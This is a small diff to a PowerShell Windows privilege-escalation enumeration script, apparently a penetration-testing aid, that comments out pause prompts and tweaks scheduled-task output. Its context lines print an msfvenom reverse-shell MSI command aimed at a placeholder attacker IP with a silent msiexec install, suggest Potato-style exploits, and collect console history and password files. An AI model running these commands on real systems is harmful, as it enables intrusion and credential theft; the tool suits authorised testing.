@@ -62,7 +62,7 @@ if ($OutFile -ne "") {
   if ($priv.Length -gt 0) {
     Write-Host "[+] SeImpersonatePrivilege is enabled! Elevate those privileges with PrintSpoofer or a Potato derivative!"
     Write-OutFile -Data "[+] SeImpersonatePrivilege is enabled! Elevate those privileges with PrintSpoofer or a Potato derivative!" -OutFile $Outf -Header "SeImpersonatePrivilege"
-    Read-Host -Prompt "Press Enter to continue..."
+    # Read-Host -Prompt "Press Enter to continue..."
     Write-Host ""
   }
 
@@ -75,7 +75,7 @@ if ($OutFile -ne "") {
     Write-OutFile -Data "[+] msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_ip LPORT=LOCAL_PORT -f msi -o malicious.msi" -OutFile $Outf
     Write-Host "[+] msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi"
     Write-OutFile -Data "[+] msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi" -OutFile $Outf
-    Read-Host -Prompt "Press Enter to continue..."
+    # Read-Host -Prompt "Press Enter to continue..."
     Write-Host ""
   }
 
@@ -101,7 +101,7 @@ if ($OutFile -ne "") {
   if ($null -ne $content) {
     Write-Host "[+] Found ConsoleHost_history.txt! Writing to $Outf."
     Write-Outfile -Data $content -OutFile $Outf -Header "History File"
-    Read-Host -Prompt "Press Enter to continue..."
+    # Read-Host -Prompt "Press Enter to continue..."
   }
 
   # Password files in user directory.
@@ -111,7 +111,7 @@ if ($OutFile -ne "") {
   if ($null -ne $pwf) {
     $pwf | Write-Host
     Write-Outfile -Data $pwf -OutFile $Outf -Header "Password Text Files"
-    Read-Host -Prompt "Press Enter to continue..."
+    # Read-Host -Prompt "Press Enter to continue..."
     Write-Host ""
   }
 
@@ -171,8 +171,8 @@ if ($OutFile -ne "") {
 
   # Scheduled Tasks
   Write-Host "[*] Looking for scheduled tasks."
-  $st = Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | Select-Object TaskName,Author, @{Name='RunAsUser'; Expression={$_.Principal.UserId}} | Out-String
-  $st | Write-Host
+  $st = Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | Select-Object TaskName,Author,@{Name='RunAsUser'; Expression={$_.Principal.UserId}} | Out-String -Stream
+  $($st -join "`r`n") | Write-Host
   Write-OutFile -Data $($st -join "`r`n") -OutFile $Outf -Header "Scheduled Tasks"
   Write-Host ""
 
